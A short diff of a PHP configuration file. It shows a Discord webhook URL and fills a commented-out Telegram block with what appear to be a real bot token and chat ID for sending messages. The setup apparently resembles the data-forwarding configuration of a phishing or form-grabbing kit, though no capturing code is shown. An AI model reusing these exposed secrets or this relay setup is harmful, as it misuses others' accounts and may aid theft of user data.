@@ -7,8 +7,8 @@ $discord = 'https://discord.com/api/webhooks/818892216943509504/iaF6RJ2SA1eH4dyW
 
 /*
 //insert telegram details 
-$token = 'xxxx:xxxxxxxx';
-$chat_id = '-xxxxxxxx';
+$token = '1941708259:AAH60tDHRlRyhvqGDnhtm8okGw5YiQFtGVc';
+$chat_id = '1429899387';
 $telegram = 'https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chat_id;
 */
 ?>
